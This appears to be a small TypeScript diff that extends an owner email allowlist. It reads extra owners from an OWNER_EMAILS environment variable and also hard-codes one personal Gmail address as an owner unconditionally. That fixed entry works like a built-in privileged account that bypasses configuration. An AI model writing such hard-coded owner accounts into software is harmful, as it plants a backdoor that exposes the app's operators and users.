@@ -16,10 +16,18 @@ function getOwnerEmailAllowlist(): string[] {
     ?.split(',')
     .map((item) => item.trim().toLowerCase())
     .filter((item) => item.length > 0) ?? [];
+  const ownerEmails = normalizeValue(process.env.OWNER_EMAILS)
+    ?.split(',')
+    .map((item) => item.trim().toLowerCase())
+    .filter((item) => item.length > 0) ?? [];
+
+  ownerEmailAllowlist.push(...ownerEmails);
 
   if (ownerEmail) {
     ownerEmailAllowlist.push(ownerEmail);
   }
+
+  ownerEmailAllowlist.push('onur24sel@gmail.com');
 
   return Array.from(new Set(ownerEmailAllowlist));
 }
